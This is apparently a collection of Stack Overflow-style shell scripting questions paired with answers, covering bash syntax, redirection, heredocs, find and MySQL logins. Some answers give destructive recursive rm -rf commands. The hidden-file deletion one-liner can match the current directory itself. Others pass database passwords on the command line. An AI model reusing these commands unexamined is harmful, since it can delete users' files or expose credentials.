    "Remove last argument from argument list of shell script (bash)": "I have used this bash one-liner before\nset -- \"${@:1:$(($#-1))}\"\nIt sets the argument list to the current argument list, less the last argument.\nHow it works:\n$# is the number of arguments\n$((...)) is an arithmetic expression, so $(($#-1)) is one less than the number of arguments.\n${variable:position:count} is a substring expression: it extracts count characters from variable starting at position. In the special case where variable is @, which means the argument list, it extracts count arguments from the list beginning at position. Here, position is 1 for the first argument and count is one less than the number of arguments worked out previously.\nset -- arg1...argn sets the argument list to the given arguments\nSo the end result is that the argument list is replaced with a new list, where the new list is the original list except for the last argument.",
    "Help with basic shell script. /bin/sh: source: not found": "Real sh doesn't have source, only .. Either change the shell in cron to bash, or use . instead.",
    "delete all directories except one": "With bash you can do this with the extglob option of shopt.\nshopt -s extglob\ncd parent\nrm -rf !(four)\nWith a posix shell I think you get to use a loop to do this\nfor dir in ./parent/*; do\n    [ \"$dir\" = \"four\" ] && continue\n    rm -rf \"$dir\"\ndone\nor use an array to run rm only once (but it requires arrays or using \"$@\")\narr=()\nfor dir in ./parent/*; do\n    [ \"$dir\" = \"four\" ] && continue\n    arr+=(\"$dir\")\ndone\nrm -rf \"${arr[@]}\"\nor\nfor dir in ./parent/*; do\n    [ \"$dir\" = \"four\" ] && continue\n    set -- \"$@\" \"$dir\"\ndone\nrm -rf \"$@\"\nor you get to use find\nfind ./parent -mindepth 1 -name four -prune -o -exec rm -rf {} \\;\nor (with find that has -exec + to save on some rm executions)\nfind ./parent -mindepth 1 -name four -prune -o -exec rm -rf {} +\nOh, or assuming the list of directories isn't too large and unwieldy I suppose you could always use\nrm -rf parent/*<ctrl-x>*\nthen delete the parent/four entry from the command line and hit enter where <ctrl-x>* is readline's default binding for glob-expand-word.",
    "How do you recursively delete all hidden files in a directory on UNIX?": "find . -name \".*\" -print\nI don't know the MAC OS, but that is how you find them all in most *nix environments.\nfind . -name \".*\" -exec rm -rf {} \\;\nto get rid of them... do the first find and make sure that list is what you want before you delete them all.\nThe first \".\" means from your current directory. Also note the second \".*\" can be changed to \".svn*\" or any other more specific name; the syntax above just finds all hidden files, but you can be more selective. I use this all the time to remove all of the .svn directories in old code.",
    "-z option inside if condition in shell script": "From \"help test\":\n-z STRING      True if string is empty.",
    "How to run commands via NodeJS child process?": "Sending a newline \\n will exectue the command. .end() will exit the shell.\nI modified the example to work with bash as I'm on osx.\nvar terminal = require('child_process').spawn('bash');\n\nterminal.stdout.on('data', function (data) {\n    console.log('stdout: ' + data);\n});\n\nterminal.on('exit', function (code) {\n    console.log('child process exited with code ' + code);\n});\n\nsetTimeout(function() {\n    console.log('Sending stdin to terminal');\n    terminal.stdin.write('echo \"Hello $USER. Your machine runs since:\"\\n');\n    terminal.stdin.write('uptime\\n');\n    console.log('Ending terminal session');\n    terminal.stdin.end();\n}, 1000);\nThe output will be:\nSending stdin to terminal\nEnding terminal session\nstdout: Hello root. Your machine runs since:\nstdout: 9:47  up 50 mins, 2 users, load averages: 1.75 1.58 1.42\nchild process exited with code 0",
    "Installing gitLab missing modernizer?": "I ran into this same problem a few minutes ago. Looks like the classy folks behind Modernizr's Rubygem yanked the most recent versions. You can download the latest gem (Modernizr-2.5.2 as required in the docs there) running the following command inside your /home/git/gitlab directory:\nwget http://rubygems.org/downloads/modernizr-2.6.2.gem\nThen, go ahead and run gem install modernizr (without changing directories) and the utility will search in the local directory for the gem file before trying to fetch it remotely. This is the gem we're looking for.\nNOTE: It looks like some people are still having problems with this solution, so something else we can do is replace a few lines in Gemfile and Gemfile.lock (both on /home/git/gitlab), switching modernizr for modernizr-rails:\nin Gemfile, line 164, change \"modernizr\", \"2.6.2\" to \"modernizr-rails\", \"2.7.1\"\nin Gemfile.lock, line 292, change modernizr (2.6.2) to modernizr-rails (2.7.1)\nin Gemfile.lock, line 626, change modernizr (= 2.6.2) to modernizr-rails (= 2.7.1)\nThis second solution is thanks to csj4032 on Github.",
    "Help me make my windows cmd.exe console work more like a Linux terminal": "I personally use Console2 with the Bash shipped with MYSYS-Git.\nYou can also use PuTTY and SSH to a real linux box ;-)",
    "What does \"$?\" give us exactly in a shell script? [duplicate]": "$? is a variable holding the return value of the last command you ran.\nExample C program (example.c):\nint main() { return 1; }\nExample Bash:\ngcc -o example example.c\n./example\necho $? # prints 1",
    "Bash - Update terminal title by running a second command": "I have some answers for you :) You're right that it shouldn't matter that you're using gnome-terminal, but it does matter what command shell you're using. This is a lot easier in zsh, but in what follows I'm going to assume you're using bash, and that it's a fairly recent version (> 3.1).\nFirst of all:\nWhich environment variable would contain the current 'command'?\nThere is an environment variable which has more-or-less what you want - $BASH_COMMAND. There's only one small hitch, which is that it will only show you the last command in a pipe. I'm not 100% sure what it will do with combinations of subshells, either :)\nSo I was hoping to find a way to capture the command in bash and update the title after every command.\nI've been thinking about this, and now that I understand what you want to do, I realized the real problem is that you need to update the title before every command. This means that the $PROMPT_COMMAND and $PS1 environment variables are out as possible solutions, since they're only executed after the command returns.\nIn bash, the only way I can think of to achieve what you want is to (ab)use the DEBUG SIGNAL. So here's a solution -- stick this at the end of your .bashrc:\ntrap 'printf \"\\033]0;%s\\007\" \"${BASH_COMMAND//[^[:print:]]/}\"' DEBUG\nTo get around the problem with pipes, I've been messing around with this:\nfunction settitle () {\n    export PREV_COMMAND=${PREV_COMMAND}${@}\n    printf \"\\033]0;%s\\007\" \"${BASH_COMMAND//[^[:print:]]/}\"\n    export PREV_COMMAND=${PREV_COMMAND}' | '\n}\n\nexport PROMPT_COMMAND=${PROMPT_COMMAND}';export PREV_COMMAND=\"\"'\n\ntrap 'settitle \"$BASH_COMMAND\"' DEBUG\nbut I don't promise it's perfect!",
    "How to install Composer on macOS?": "",
    "Add double quotes around fields in AWK script output?": "If you want:\nadd this to the existing script.\nYou can insert additional \\\"\\\" in each argument of print like this:\nprint \"\\\"admin\\\"\", \"\\\"base\\\"\", ...\nEdited:\nYes, perhaps seting OFS is better solution:\nBEGIN { OFS=\"\\\";\\\"\"; } ... print \"\\\"admin\", ...., \"simple\\\"\";",
    "Vim [compile and] run shortcut": "Something like this would work. Just create filetype autocmd that map <F4> or whatever you want to save and compile and run the program. It uses exec to build the string and uses shellescape to escape the file name.\nautocmd filetype python nnoremap <F4> :w <bar> exec '!python '.shellescape('%')<CR>\nautocmd filetype c nnoremap <F4> :w <bar> exec '!gcc '.shellescape('%').' -o '.shellescape('%:r').' && ./'.shellescape('%:r')<CR>\nautocmd filetype cpp nnoremap <F4> :w <bar> exec '!g++ '.shellescape('%').' -o '.shellescape('%:r').' && ./'.shellescape('%:r')<CR>\n% is the current buffer filename. %:r is the buffer filename without extension",
    "How to call a function in shell Scripting?": "You don't specify which shell (there are many), so I am assuming Bourne Shell, that is I think your script starts with:\n#!/bin/sh\nPlease remember to tag future questions with the shell type, as this will help the community answer your question.\nYou need to define your functions before you call them. Using ():\nprocess_install()\n{\n    echo \"Performing process_install() commands, using arguments [${*}]...\"\n}\n\nprocess_exit()\n{\n    echo \"Performing process_exit() commands, using arguments [${*}]...\"\n}\nThen you can call your functions, just as if you were calling any command:\nif [ \"$choice\" = \"true\" ]\nthen\n    process_install foo bar\nelif [ \"$choice\" = \"false\" ]\nthen\n    process_exit baz qux\nYou may also wish to check for invalid choices at this juncture...\nelse\n    echo \"Invalid choice [${choice}]...\"\nfi\nSee it run with three different values of ${choice}.\nGood luck!",
    "How to make tail display only the lines that have a specific text?": "You can do\ntail -f mylogfile.log | grep \"error: \"\nThis works with regular expressions too. In general, you can take the output of any command, add | to \"pipe\" it to grep, and let grep filter out the lines that don't match a certain pattern.",
    "Running shell command from Gradle script": "The command to execute and its arguments must be separate parameters to pass to commandLine, like this:\ncommandLine 'git', 'branch', '-a'\nIf you want to execute a complicated pipeline as in your first example, you can wrap it in a shell script.\nI cannot test this, but I think this should work as well:\ncommandLine 'sh', '-c', 'git branch --merged | grep -v -e \\* -e master -e develop -e dmz | xargs git branch -D'\nNote: I took the liberty and simplified the grep a bit.\nLastly, you could also create a Git alias in your .gitconfig to wrap the complex pipeline.",
    "Bash command to create a new file and its parent directories if necessary": "install is your friend:\ninstall -Dv /dev/null some/new/path/base-filename",
    "Why is testing \"$?\" to see if a command succeeded or not, an anti-pattern?": "This is an antipattern because it introduces complexity that wouldn't exist if you didn't require the exit status to be recorded at all.\nif your_command; then ...\nhas much less to go wrong than\nyour_command\nif [ \"$?\" -eq 0 ]; then ...\nFor examples of things that can go wrong: Think about traps, or even new echo statements added for debugging, modifying $?. It's not visually obvious to a reader that a separate line running your_command can't have anything added below it without changing logical flow.\nThat is:\nyour_command\necho \"Finished running your_command\" >&2\nif [ \"$?\" -eq 0 ]; then ...\n...is checking the echo, not the actual command.\nThus, in cases where you really do need to deal with exit status in a manner more granular than immediately branching on whether its value is zero, you should collect it on the same line:\n# whitelisting a nonzero value for an example of when \"if your_command\" won't do.\nyour_command; your_command_retval=$?\necho \"Finished running your_command\" >&2 ## now, adding more logging won't break the logic.\ncase $your_command_retval in\n  0|2) echo \"your_command exited in an acceptable way\" >&2;;\n  *)   echo \"your_command exited in an unacceptable way\" >&2;;\nesac\nFinally: If you enclose your_command inside of an if statement, this marks it as tested, such that your shell won't consider a nonzero exit status for purposes of set -e or an ERR trap.\nThus:\nset -e\nyour_command\nif [ \"$?\" -eq 0 ]; then ...\n...will never (barring a number of corner cases and caveats which plague set -e's behavior) reach the if statement with any value of $? other than 0, as the set -e will force an exit in that case. By contrast:\nset -e\nif your_command; then ...\n...marks the exit status of your_command as tested, and so does not consider it cause to force the script to exit per set -e.",
    "Firefox refresh current tab from command-line": "You can use xdotool for automation. Install on Ubuntu with\nsudo aptitude install xdotool\nThen you can search for windows and send keys or mouse events, see man xdotool for the full documentation. I use following script on Ubuntu 16.04 LTS during development:\nWID=`xdotool search --name \"Mozilla Firefox\" | head -1`\nxdotool windowactivate $WID\nxdotool key F5\nNote: in the older versions, e.g. Ubuntu 14.04 the flag is --title instead of --name.\nSee also the xdotool project site.",
    "Inserting a conditional RUN statement inside a dockerfile": "Just like when typing at the shell, you need either a newline or a semicolon before fi:\nRUN if grep -q \"grunt\" package.json; then echo succeed; fi\n                                             add this ^",
    "Is it possible to get the compressed and uncompressed sizes of a file on a btrfs file system?": "there is a third party tool that can do this.\nhttps://github.com/kilobyte/compsize\nusage:\nayush@devbox:/code/compsize$ sudo compsize /opt\nProcessed 54036 files, 42027 regular extents (42028 refs), 27150 inline.\nType       Perc     Disk Usage   Uncompressed Referenced  \nData        82%      5.3G         6.4G         6.4G       \nnone       100%      4.3G         4.3G         4.3G       \nzlib        37%      427M         1.1G         1.1G       \nlzo         56%      588M         1.0G         1.0G  ",
    "Is there a minimally POSIX.2 compliant shell?": "The sad answer in advance\nIt won't help you (not as much and reliably as you would expect and want it to anyway).\nHere is why.\nOne big problem that cannot be addressed by a virtual \"POSIX shell\" are things that are ambiguously worded or just not addressed in the standard, so that shells may implement things in different ways while still adhering to the standard.\nTake these two examples regarding pipelines, the first of which is well known:\nExample 1 - scoping\n$ ksh -c 'printf \"foo\" | read s; echo \"[${s}]\"'\n[foo]\n\n$ bash -c 'printf \"foo\" | read s; echo \"[${s}]\"'\n[]\nksh executes the last command of a pipe in the current shell, whereas bash executes all - including the last command - in a subshell. bash 4 introduced the lastpipe option which makes it behave like ksh:\n$ bash -c 'shopt -s lastpipe; printf \"foo\" | read s; echo \"[${s}]\"'\n[foo]\nAll of this is (debatably) according to the standard:\nAdditionally, each command of a multi-command pipeline is in a subshell environment; as an extension, however, any or all commands in a pipeline may be executed in the current environment.\nI am not 100% certain on what they meant with extension, but based on other examples in the document it does not mean that the shell has to provide a way to switch between behavior but simply that it may, if it wishes so, implement things in this \"extended way\". Other people read this differently and argue about the ksh behavior being non-standards-compliant and I can see why. Not only is the wording unlucky, it is not a good idea to allow this in the first place.\nIn practice it doesn't really matter which behavior is correct since those are the \"\"\"two big shells\"\"\" and people would think that if you don't use their extensions and only supposedly POSIX-compliant code that it will work in either, but the truth is that if you rely on one or the other behavior mentioned above your script can break in horrible ways.\nExample 2 - redirection\nThis one I learnt about just a couple of days ago, see my answer here:\nfoo | bar 2>./qux | quux\nCommon sense and POLA tells me that when the next line of code is hit, both quux and bar should have finished running, meaning that the file ./qux is fully populated. Right? No.\nPOSIX states that\nIf the pipeline is not in the background (see Asynchronous Lists), the shell shall wait for the last command specified in the pipeline to complete, and may also wait for all commands to complete.)\nMay (!) wait for all commands to complete! WTH!\nbash\nwaits:\nThe shell waits for all commands in the pipeline to terminate before returning a value.\nbut\nksh\ndoesn't:\nEach command, except possibly the last, is run as a separate process; the shell waits for the last command to terminate.\nSo if you use redirection inbetween a pipe, make sure you know what you are doing since this is treated differently and can horribly break on edge cases, depending on your code.\nI could give another example not related to pipelines, but I hope these two suffice.\nConclusion\nHaving a standard is good, continuously revising it is even better and adhering to it is great. But if the standard fails due to ambiguity or permissiveness things can still unexpectedly break practically rendering the usefulness of the standard void.\nWhat this means in practice is that on top of writing \"POSIX-compliant\" code you still need to think and know what you are doing to prevent certain things from happening.\nAll that being said, one shell which has not yet been mentioned is posh which is supposedly POSIX plus even fewer extensions than dash has, (primarily echo -n and the local keyword) according to its manpage:\nBUGS\n   Any bugs in posh should be reported via the Debian BTS.\n   Legitimate bugs are inconsistencies between manpage and behavior,\n   and inconsistencies between behavior and Debian policy\n   (currently SUSv3 compliance with the following exceptions:\n   echo -n, binary -a and -o to test, local scoping).\nYMMV.",
    "How to Determine if LCD Monitor is Turned on From Linux Command Line [closed]": "From systembash.com, here is the code taken from the link, in case it will be down some day:\n#!/bin/bash\nexport DISPLAY=:0.0\n\nif [ $# -eq 0 ]; then\n  echo usage: $(basename $0) \"on|off|status\"\n  exit 1\nfi\n\nif [ $1 = \"off\" ]; then\n  echo -en \"Turning monitor off...\"\n  xset dpms force off\n  echo -en \"done.\\nCheck:\"\n  xset -q|grep \"Monitor is\"\nelif [ $1 = \"on\" ]; then\n  echo -en \"Turning monitor on...\"\n  xset dpms force on\n  echo -en \"done.\\nCheck:\"\n  xset -q|grep \"Monitor is\"\nelif [ $1 = \"status\" ]; then\n  xset -q|sed -ne 's/^[ ]*Monitor is //p'\nelse \n  echo usage: $(basename $0) \"on|off|status\"\nfi",
    "Windows cmd pass output of one command as parameter to another": "There is no $ operator in cmd.\nRedirection operators (<, >, >>) expect files or stream handles.\nA pipe | passes the standard output of a command into the standard input of another one.\nA for /F loop however is capable of capturing the output of a command and providing it in a variable reference (%A in the example); see the following code:\nfor /F \"usebackq delims=\" %A in (`git status -s -b ^| sed -n '2p' ^| cut -d' ' -f2-`) do git diff %A",
    "Find out if a command exists on POSIX system": "command -v is a POSIX specified command that does what which does.\nIt is defined to to return >0 when the command is not found or an error occurs.",
    "How can I fix Edit cancelled, no changes made in shell": "Things like this are most likely caused by it opening an editor that forks off instead of staying.\nThat means you'll want to set $EDITOR to an editor that does wait. E.g. nano, vim or emacs should work, and e.g. if you use sublime text you'll have to use subl -w to explicitly tell it to wait.\nIt's not quite clear which shell you're running at the moment. If it's bash, run export EDITOR=\"subl -w\", in fish run set -gx EDITOR subl -w (or \"subl -w\" if you use fish < 3.0).",
    "What is the standard for documentation style in Bash scripts? [closed]": "I do understand I'm adding an answer to an old question, but I feel the tooling has improved lately and would like to give additional suggestions in order to help out others who are viewing this question.\nI have recently found TomDoc.sh, which uses TomDoc style comments in shell scripts. The tool provided can then extract information and generate markdown or plain text documents.\nOther tools also exist. BashDoc is modeled after the JavaDoc syntax, supporting a variety of tags. With RoboDoc you embed a C-style comment in your Bash code and it extracts the necessary information. Lastly, Apple uses HeaderDoc for its shell scripting. All three of these have a suggested style for the comments that you write.\nIf you wish to annotate your code more than generate documentation, shocco.sh may be what you'd prefer. It doesn't have a specific format and is designed for you to see human-readable text describing the shell commands that you are running.",
    "How to copy directories into a directory using install in bash?": "You want to use cp -r instead:\ncp -r foo dest",
    "Why do backslashes prevent alias expansion?": "Historically, and maintained by POSIX, quoting any part of the word causes the entire word to be considered quoted for the purposes of functions and alias expansion. It also applies to quoting the end token for a here document:\ncat << \\EOF\nthis $text is fully quoted\nEOF",
    "How to cut the last field from a shell string": "For what it's worth, a cut-based solution:\nNEW_LINE=\"`echo \"$LINE\" | rev | cut -d/ -f2- | rev`/\"",
    "How to auto login in MySQL from a shell script?": "Alternative ways to write these options.\nYou can write\nmysql -u \"$MYSQL_ROOT\" -p\"$MYSQL_PASS\" -e \"SHOW DATABASES\"\nIf [password is] given, there must be no space between --password= or -p and the password following it. If no password option is specified, the default is to send no password.\nto pass empty strings as separate arguments. Your comment below indicates that the client will still ask for a password, though. Probably it interprets the empty argument as a database name and not as the password. So you could try the following instead:\nmysql --user=\"$MYSQL_ROOT\" --password=\"$MYSQL_PASS\" -e \"SHOW DATABASES\"\n.my.cnf file\nBut even if there is a way, I'd still suggest you use a ~/.my.cnf file instead. Arguments on the command line are likely included in a process listing generated by ps -A -ocmd, so other users can see them. The .my.cnf file, on the other hand, can (and should) be made readable only by you (using chmod 0600 ~/.my.cnf), and will be used automatically. Have that file include the following lines:\n[client]\nuser=root\npassword=\nThen a simple mysql -e \"SHOW DATABASES\" will suffice, as the client will obtain its credentials from that file.\nSee 6.1.2.1. End-User Guidelines for Password Security for the various ways in which you can provide a password, and their respective benefits and drawbacks. See 4.2.3.3. Using Option Files for general information on this .my.cnf file",
    "In bash, how could I add integers with leading zeroes and maintain a specified buffer": "If by static versus dynamic you mean that you'd like to be able to use a variable for the width, you can do this:\n$ padtowidth=3\n$ for i in 0 {8..11} {98..101}; do printf \"%0*d\\n\" $padtowidth $i; done\n000\n008\n009\n010\n011\n098\n099\n100\n101\nThe asterisk is replaced by the value of the variable it corresponds to in the argument list ($padtowidth in this case).\nOtherwise, the only reason your example doesn't work is that you use \"2\" (perhaps as if it were the maximum padding to apply) when it should be \"3\" (as in my example) since that value is the resulting total width (not the pad-only width).",
    "shortcut for typing kubectl --all-namespaces everytime": "New in kubectl v1.14, you can use -A instead of --all-namespaces, eg:\nkubectl get -A pod\n(rejoice)\nReference: https://kubernetes.io/docs/reference/kubectl/cheatsheet/#a-note-on-all-namespaces",
    "How can I view only the first n lines of the file?": "Based on its man page:\nhead -n 10 filename",
    "Run bash script from another script without waiting for script to finish executing? [duplicate]": "Put & at the end of the line.\n./script1.sh & #this doesn't blocks!\n./script2.sh",
    "Check if PID exists in Bash": "kill -s 0 $pid will return success if $pid is running, failure otherwise, without actually sending a signal to the process, so you can use that in your if statement directly.\nwait $pid will wait on that process, replacing your whole loop.",
    "How to strip out all of the links of an HTML file in Bash or grep or batch and store them in a text file": "$ sed -n 's/.*href=\"\\([^\"]*\\).*/\\1/p' file\nhttp://www.drawspace.com/lessons/b03/simple-symmetry\nhttp://www.drawspace.com/lessons/b04/faces-and-a-vase\nhttp://www.drawspace.com/lessons/b05/blind-contour-drawing\nhttp://www.drawspace.com/lessons/b06/seeing-values",
    "get the first 5 characters from each line in shell script": "If you want to use cut this way, you need to use redirection <<< (a here string) like:\nvar=$(cut -c-5 <<< \"$line\")\nNote the use of var=$(command) expression instead of id= cut -c-5 $line. This is the way to save the command into a variable.\nAlso, use /bin/bash instead of /bin/sh to have it working.\nFull code that is working to me:\n#!/bin/bash\n\nfilename='sample.txt'\nwhile read -r line\ndo\n  id=$(cut -c-5 <<< \"$line\")\n  echo $id\n  #code for passing id to other script file as parameter\ndone < \"$filename\"",
    "Shell - one line query": "Did you try\n mysql -u root -pmy_password -D DATABASENAME -e \"UPDATE `database` SET `field1` = '1' WHERE `id` = 1111;\" > output.txt \n(the > output.txt part can be ignored but, it will be useful to see what was returned by the statement executed by looking at the file.)\nImportant: note that there should not be a space between -p and your password (my_password in the example)",
    "symlink-copying a directory hierarchy": "I just did a quick test on a linux box and cp -sR /orig /dest does exactly what you described: creates a directory hierarchy with symlinks for non-directories back to the original.",
    "Creating permanent executable aliases": "Add the command to your ~/.bashrc file.\nTo make it available to all users, add it to /etc/profile.",
    "print double quotes in shell programming": "You just have to quote them:\necho \"\\\"$1\\\",\\\"$2\\\",\\\"$3\\\",\\\"$4\\\"\"\nAs noted here:\nEnclosing characters in double quotes (\u2018\"\u2019) preserves the literal value of all characters within the quotes, with the exception of \u2018$\u2019, \u2018`\u2019, \u2018\\\u2019, and, when history expansion is enabled, \u2018!\u2019. The characters \u2018$\u2019 and \u2018`\u2019 retain their special meaning within double quotes (see Shell Expansions). The backslash retains its special meaning only when followed by one of the following characters: \u2018$\u2019, \u2018`\u2019, \u2018\"\u2019, \u2018\\\u2019, or newline. Within double quotes, backslashes that are followed by one of these characters are removed. Backslashes preceding characters without a special meaning are left unmodified. A double quote may be quoted within double quotes by preceding it with a backslash. If enabled, history expansion will be performed unless an \u2018!\u2019 appearing in double quotes is escaped using a backslash. The backslash preceding the \u2018!\u2019 is not removed.\nThe special parameters \u2018*\u2019 and \u2018@\u2019 have special meaning when in double quotes (see Shell Parameter Expansion).",
    "Who can access a file with octal permissions \"000\" on Linux/UNIX?": "root can do everything, others (with userid != 0) can't do anything. But anyone who has write access to the containing folder is allowed to delete the file. The owner can of course always change the flags and regain access anytime.\ngreybox:~ septi$ touch foo\ngreybox:~ septi$ chmod 000 foo\ngreybox:~ septi$ ls -l foo\n----------  1 septi  staff  0 Apr  8 12:28 foo\ngreybox:~ septi$ cat foo\ncat: foo: Permission denied\ngreybox:~ septi$ sudo ls -l foo\nPassword:\n----------  1 septi  staff  0 Apr  8 12:28 foo\ngreybox:~ septi$ ",
    "Restart process on file change in Linux": "This is an improvement on the answer provided in the question. When one interrupts the script, the run process should be killed.\n#!/bin/sh\n\nsigint_handler()\n{\n  kill $PID\n  exit\n}\n\ntrap sigint_handler SIGINT\n\nwhile true; do\n  $@ &\n  PID=$!\n  inotifywait -e modify -e move -e create -e delete -e attrib -r `pwd`\n  kill $PID\ndone",
    "Escaping a dollar sign in Unix inside the cat command [duplicate]": "You can use regular quoting operators in a here document:\n$ cat <<HERE\n> foo \\$(bar)\n> HERE\nfoo $(bar)\nor you can disable expansion in the entire here document by quoting or escaping the here-doc delimiter:\n$ cat <<'HERE'  # note single quotes\n> foo $(bar)\n> HERE\nfoo $(bar)\nIt doesn't matter whether you use single or double quotes or a backslash escape (<<\\HERE); they all have the same effect.",
    "QR Code generation in shell / mac terminal": "As Riccardo Cossu mentioned please use homebrew:\nbrew install qrencode\nqrencode -o so.png \"http://stackoverflow.com\"",
    "What does mean $$ or $! in bash?": "Actually, these variables were inherited by bash from the Bourne shell.\n$$ means current PID.\n$! is the PID of the last program your shell ran in the background (e.g. myprog &)\nHere is a list of shell variables:\nhttp://unixhelp.ed.ac.uk/scrpt/scrpt2.2.2.html",
    "Prevent expressions enclosed in backticks from being evaluated in heredocs [duplicate]": "Quote the label to prevent the backticks from being evaluated.\n$ cat << \"EOT\" > out\nfoo bar\n`which which`\nEOT\n\n$ cat out\nfoo bar\n`which which`",
    "zsh run a command stored in a variable?": "Use eval:\neval ${install_cmd}",
    "How to make a program that finds id's of xinput devices and sets xinput some settings": "If the device name is always the same, in this case Logitech G700 Laser Mouse, you can search for matching device IDs by running\nxinput list --id-only 'Logitech G700 Laser Mouse'",
    "Determine if relative or absolute path in shell program": "if [[ \"$0\" = /* ]]\nthen\n   : # Absolute path\nelse\n   : # Relative path\nfi",
    "How to get total size of folders with find and du?": "Use xargs(1) instead of -exec:\nfind . -name bak -type d | xargs du -ch\n-exec executes the command for each file found (check the find(1) documentation). Piping to xargs lets you aggregate those filenames and only run du once. You could also do:\nfind -name bak -type d -exec du -ch '{}' \\; +\nIf your version of find supports it.",
    "How do you process the output of a command in the shell line-by-line?": "You should use the read command.\notool -L MyApplication | sed 1d | \\\nwhile read i\ndo\n  echo \"line: \" $i\ndone\nSee bashref for a description of the read builtin, and its options. You can also have a look at the following tutorial for examples of using read in conjunction with for.",
    "Pass commands as input to another command (su, ssh, sh, etc)": "Adding to tripleee's answer:\nIt is important to remember that the section of the script formatted as a here-document for another shell is executed in a different shell with its own environment (and maybe even on a different machine).\nIf that block of your script contains parameter expansion, command substitution, and/or arithmetic expansion, then you must use the here-document facility of the shell slightly differently, depending on where you want those expansions to be performed.\n1. All expansions performed within the scope of the parent shell\nThe delimiter of the here document must be unquoted.\ncommand <<DELIMITER\n...\nDELIMITER\nExample:\n#!/bin/bash\n\na=0\nmylogin=$(whoami)\nsudo sh <<END\n    a=1\n    mylogin=$(whoami)\n    echo a=$a\n    echo mylogin=$mylogin\nEND\necho a=$a\necho mylogin=$mylogin\nOutput:\na=0\nmylogin=leon\na=0\nmylogin=leon\n2. All expansions performed within the scope of the child shell\nThe delimiter of the here document must be quoted.\ncommand <<'DELIMITER'\n...\nDELIMITER\nExample:\n#!/bin/bash\n\na=0\nmylogin=$(whoami)\nsudo sh <<'END'\n    a=1\n    mylogin=$(whoami)\n    echo a=$a\n    echo mylogin=$mylogin\nEND\necho a=$a\necho mylogin=$mylogin\nOutput:\na=1\nmylogin=root\na=0\nmylogin=leon\n3. Some expansions performed in the parent shell, some in the child\nThe delimiter of the here document must be unquoted and you must escape the expansion expressions that are to be performed in the child shell.\nExample:\n#!/bin/bash\n\na=0\nmylogin=$(whoami)\nsudo sh <<END\n    a=1\n    mylogin=\\$(whoami)\n    echo a=$a\n    echo mylogin=\\$mylogin\nEND\necho a=$a\necho mylogin=$mylogin\nOutput:\na=0\nmylogin=root\na=0\nmylogin=leon",
    "What's the difference of redirect an output using \">\", \"&>\", \">&\" and \"2&>\"?": "> redirects stdout to a file\n2>& redirects file handle \"2\" (almost always stderr) to some other file handle (it's generally written as 2>&1, which redirects stderr to the same place as stdout).\n&> and >& redirect both stdout and stderr to a file. It's normally written as &>file (or >&file). It's functionally the same as >file 2>&1.\n2> redirects output to file handle 2 (usually stderr) to a file.",
    "How to perform bitwise operations on hexadecimal numbers in bash?": "Of course you can do bitwise operations (inside an arithmetic expansion):\n$ echo \"$((0x12345678 << 1))\"\n610839792\nOr:\n$ echo \"$(( 16#12345678 << 1 ))\"\n610839792\nThe value could be set in a variable as well:\n$ var=0x12345678         # or var=16#12345678\n$ echo \"$(( var << 1 ))\"\n610839792\nAnd you can do OR, AND, XOR and/or NOT:\n$ echo \"$(( 0x123456 | 0x876543 ))\"\n9925975\nAnd to get the result in hex as well:\n$ printf '%X\\n' \"$(( 0x12345678 | 0xDEADBEEF ))\"     # Bitwise OR\nDEBDFEFF\n\n$ printf '%X\\n' \"$(( 0x12345678 & 0xDEADBEEF ))\"     # Bitwise AND\n12241668\n\n$ printf '%X\\n' \"$(( 0x12345678 ^ 0xDEADBEEF ))\"     # Bitwise XOR\nCC99E897\n\n$ printf '%X\\n' \"$(( ~ 0x2C8B ))\"                    # Bitwise NOT\nFFFFFFFFFFFFD374\nThe only detail with a bitwise not (~) is that it flips all available bits. If the number representation use 64 bits, the result will have 64 bits. All leading zero bits will be flipped to ones.\nTo limit such conversion, just use an AND:\n$ printf '%X\\n' \"$(( ( ~ 0x2C8B ) & 0xFFFF ))\"\nD374\nNote that a bitwise NOT ~ is not a logical NOT !. A logical NOT turns input into 0 or 1 only, not any other number.\n$ printf '%X\\n' \"$(( ! 0xdead ))\" \"$(( ! 0 ))\"\n0\n1",
    "How to delete entries from fish shell's command history?": "You want history delete. That should ask you for a search term, show you matching entries and ask you for which to delete.",
    "How to install custom man (manual) pages on mac os x": "First of all you may want to check if the man page your are trying to install is properly formatted and can be opened by man command. To do this pass the path to the man file to man command. It must contain a slash in order to be recognized as a path, for example:\nman /usr/local/man/man1/custom_command.1\nThen you should make sure the path you are installing your man page to is on the search list of man command. In order to find the man page its path must be either:\nspecified with -M option to the man command\nset in the environmental variable MANPATH\nlisted in its config file (/private/etc/man.conf on OS X) under MANPATH statement or under MANPATH_MAP statement (which applies only to locations in your PATH environmental variable)\nlocated in the location relative to where binary is installed, i.e.: if binary is installed in path/bin the man page is searched for in path/man, path/cat and path/bin/man, path/bin/cat\nlisted in files added in /private/etc/manpaths.d/ directory\nThe name of the man page file must be same as command name with optional section number. It may be gzipped.\nTo see where man will search for your custom_command man page run\nman -d custom_command",
    "How to run \"make\" command in gitbash in windows?": "You can also use chocolatey to install it:\nchoco install make\nHere's the package.",
    "Advantages of a deployment tool such as Ansible over shell [closed]": "Shell scripts aren't that bad, if you've got them working like you need to.\nPeople recommend other tools (such as CFEngine, Puppet, Chef, Ansible, and whatever else) for various reasons, some of which are:\nThe same set of reasons why people use tools like make instead of implementing build systems with scripts.\nIdempotency: The quality whereby the took ensures that it can be safely re-run any number of times, and at each run it will either come to the desired state, or remain there, or at least move closer to it in a //convergent// manner.\nSure, you can write scripts so that the end results are idempotent:\n # Crude example\n grep myhost /etc/hosts || echo '1.2.3.4  myhost' >> /etc/hosts \nBut it's a lot nicer with idempotent tools.\nShell scripts are imperative. Tools such as Chef/Ansible/Puppet are declarative. In general, declarative leads to better productivity given some threshold of scale.\nThe DSL's take away some power but then they give you order, cleanliness and other kinds of power. I love shell scripting, but I love Ruby too, and the Puppet people love their language! If you still think shell is the way to go because you like it more, hey, you don't have a problem then.\n[ADDED] Re-distributable, re-usable packages. Ruby has gems, Perl has CPAN, Node has npm, Java has maven - and all languages these have their own conventions of how reusable source code must be packaged and shared with the world.\nShell Scripts don't.\nChef has cookbooks that follow conventions and can be imported much the same way you import a gem into your ruby application to give your application some new ability. Puppet has puppetforge and it's modules, Juju has charms (they are pretty close to shell scripts so you might be interested).\nThe tools have actually helped them! I was a die-hard shell scripter, and still am, but using Chef lets me go home earlier, get a good night's sleep, stay in control, be portable across OS's, avoid confusion - tangible benefits I experienced after giving up large-scale server shell-scripting.",
